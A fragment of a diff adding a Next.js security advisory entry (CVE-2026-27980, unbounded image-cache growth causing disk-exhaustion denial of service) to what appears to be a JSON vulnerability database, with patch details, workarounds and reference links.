+          "cwe": [
+            "CWE-400"
+          ],
+          "identifiers": {
+            "summary": "## Summary\nThe default Next.js image optimization disk cache (`/_next/image`) did not have a configurable upper bound, allowing unbounded cache growth.\n\n## Impact\nAn attacker could generate many unique image-optimization variants and exhaust disk space, causing denial of service.\n\n## Patches\nFixed by adding an LRU-backed disk cache with `images.maximumDiskCacheSize`, including eviction of least-recently-used entries when the limit is exceeded. Setting `maximumDiskCacheSize: 0` disables disk caching. \n\n## Workarounds\nIf upgrade is not immediately possible:\n- Periodically clean `.next/cache/images`.\n- Reduce variant cardinality (e.g., tighten values for `images.localPatterns`, `images.remotePatterns`, and `images.qualities`)",
+            "githubID": "GHSA-3x4c-7xq6-9pq8",
+            "CVE": [
+              "CVE-2026-27980"
+            ]
+          },
+          "info": [
+            "https://github.com/vercel/next.js/security/advisories/GHSA-3x4c-7xq6-9pq8",
+            "https://github.com/vercel/next.js/commit/39eb8e0ac498b48855a0430fbf4c22276a73b4bd",
+            "https://github.com/vercel/next.js/releases/tag/v16.1.7"
+          ]
+        },
+        {
+          "atOrAbove": "16.0.0-beta.0",
           "below": "16.1.7",
           "severity": "medium",
           "cwe": [
